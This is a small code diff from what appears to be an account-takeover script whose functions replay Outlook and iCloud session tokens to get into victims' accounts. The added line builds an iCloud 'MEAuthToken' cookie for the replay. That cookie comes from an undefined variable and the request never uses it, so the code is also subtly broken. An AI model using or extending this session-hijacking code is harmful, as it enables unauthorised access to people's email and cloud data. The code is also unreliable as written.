@@ -77,6 +77,7 @@ def replay_outlook(outlook_token):
 def replay_icloud(icloud_token):
     print(f"[🍏] Accessing iCloud...")
     headers = {"Authorization": f"Bearer {icloud_token}"}
+    cookies = {"MEAuthToken": icloud_cookie}
     response = requests.get("https://www.icloud.com", headers=headers)
     if response.status_code == 200:
         print("[✅] Successfully accessed iCloud.")
